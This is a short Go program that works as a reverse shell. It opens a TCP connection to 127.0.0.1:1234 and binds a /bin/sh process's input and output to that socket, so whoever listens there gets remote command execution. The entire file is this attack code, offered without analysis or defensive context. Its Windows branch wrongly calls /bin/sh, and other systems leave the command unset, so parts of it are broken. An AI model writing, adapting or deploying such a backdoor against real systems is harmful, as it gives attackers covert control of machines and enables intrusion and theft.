package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

func main() {

	// Establish a TCP connection to the specified address
	connection, _ := net.Dial("tcp", "127.0.0.1:1234")

	// Define command variable
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// Create a new command object for the shell
		cmd = exec.Command("/bin/sh")
	} else if runtime.GOOS == "linux" {
		fmt.Println("Hello linux")
		cmd = exec.Command("/bin/sh")
	}

	// Set the command's standard input, output, and error to the TCP connection
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	// Run the command
	cmd.Run()
}
